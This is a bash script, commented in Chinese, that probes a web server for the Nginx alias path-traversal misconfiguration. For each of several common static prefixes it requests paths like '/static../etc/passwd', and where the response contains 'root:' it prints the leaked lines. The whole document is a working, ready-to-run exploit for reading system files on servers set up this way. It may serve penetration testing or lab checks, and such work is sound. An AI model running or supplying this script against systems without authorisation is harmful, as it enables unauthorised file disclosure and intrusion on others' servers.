#!/bin/bash
# Nginx alias 路径穿越探测
# Usage: nginx_alias_traversal.sh <ENDPOINT>
set -euo pipefail

ENDPOINT="${1:-http://127.0.0.1:8080}"

found=""
for prefix in /static /files /assets /images /uploads /media /css /js /data; do
  # 先确认路径存在
  code=$(curl -s -o /dev/null -w "%{http_code}" "${ENDPOINT}${prefix}/" --max-time 5)
  if [ "$code" = "200" ] || [ "$code" = "403" ] || [ "$code" = "301" ]; then
    # 尝试穿越
    content=$(curl -s "${ENDPOINT}${prefix}../etc/passwd" --max-time 5)
    if echo "$content" | grep -q "root:"; then
      echo "ALIAS_TRAVERSAL:${prefix}:SUCCESS"
      echo "$content" | head -5
      found="yes"
      break
    fi
    # 多级穿越
    content=$(curl -s "${ENDPOINT}${prefix}../../etc/passwd" --max-time 5)
    if echo "$content" | grep -q "root:"; then
      echo "ALIAS_TRAVERSAL:${prefix}../../:SUCCESS"
      echo "$content" | head -5
      found="yes"
      break
    fi
  fi
done
[ -z "$found" ] && echo "NO_ALIAS_TRAVERSAL"
